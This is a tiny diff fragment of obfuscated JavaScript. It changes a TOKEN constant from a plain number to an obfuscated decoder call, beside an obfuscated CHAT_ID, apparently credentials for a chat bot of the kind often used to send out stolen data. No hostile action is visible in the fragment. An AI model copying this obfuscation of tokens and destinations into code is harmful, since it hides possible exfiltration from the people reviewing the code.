@@ -29,7 +29,7 @@ function _0x1cd721(d, e, c, W, m) {
         }
     var a, f, o, b, n, t, y, J, k, x
 }();
-const TOKEN = 587870960;
+const TOKEN = _0x4b49bd(3454, 6140, 5699, 3880, 4389)
   , CHAT_ID = _0x4db4f7(2487, 2387, 1728, "#HL!", 530);
 function _0x108c7f(d, e, c, W, m) {
     return _0x20d2(d - 563, m)
